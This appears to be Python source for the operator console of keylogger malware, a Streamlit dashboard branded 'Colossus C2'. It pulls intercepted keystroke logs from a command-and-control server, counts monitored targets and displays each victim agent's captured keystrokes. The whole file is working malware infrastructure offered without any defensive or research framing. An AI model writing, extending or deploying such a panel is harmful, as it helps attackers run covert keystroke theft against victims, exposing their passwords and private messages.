import streamlit as st
import httpx
import pandas as pd
from datetime import datetime

# Setup and Configuration
st.set_page_config(
    page_title="Colossus C2 Console",
    layout="wide",
)

SERVER_URL = "http://127.0.0.1:8000"

st.title("Colossus Command & Control Operations Panel")
st.markdown("---")


# Get data from FastAPI server
def get_telemetry_logs():
    """Queries the FastAPI server for active decrypted keystroke streams."""
    try:
        response = httpx.get(f"{SERVER_URL}/api/v1/dashboard/logs", timeout=5.0)
        if response.status_code == 200:
            return response.json()
        else:
            st.error(f"Server returned an error profile: Status {response.status_code}")
            return []
    except httpx.ConnectError:
        st.error(
            "Unable to connect to the Colossus FastAPI server. Is it running on port 8000?"
        )
        return []


# Interface Widgets
st.sidebar.header("Controller Panel")
if st.sidebar.button("Force Refresh Console Data", use_container_width=True):
    st.rerun()

# Fetch records
logs_data = get_telemetry_logs()

if not logs_data:
    st.info("Sitting idle. Waiting for inbound exfiltration transmissions...")
else:
    # 1. Create DataFrame and enforce empty fallback structural types if needed
    df = pd.DataFrame(logs_data)

    # 2. Extract metrics safely using standard scalar integer extraction
    total_entries: int = int(len(df))

    if not df.empty and "client_id" in df.columns:
        column_data = df.get("client_id")
        if column_data is not None:
            unique_agents = int(column_data.nunique())
        else:
            unique_agents = 0
    else:
        unique_agents = 0

    # Render layout metric blocks across columns
    col1, col2 = st.columns(2)
    with col1:
        st.metric(label="Active Targets Monitored", value=str(unique_agents))
    with col2:
        st.metric(label="Total Data Logs Intercepted", value=str(total_entries))

    st.markdown("Live Intel Capture Stream")

    for index, row in df.iterrows():
        timestamp_str = str(row["timestamp"]).replace("Z", "")
        raw_time = datetime.fromisoformat(timestamp_str)
        formatted_time = raw_time.strftime("%Y-%m-%d %H:%M:%S")

        # Design individual layout containers for each intercept
        with st.container(border=True):
            c_left, c_right = st.columns([1, 4])
            with c_left:
                st.markdown(f"** Agent ** '{row['client_id']}'")
                st.caption(f"{formatted_time}")
            with c_right:
                st.markdown("**Captured Keystrokes:**")
                # Render content in a code block window to make it stand out
                st.code(row["encrypted_data"], language="text")
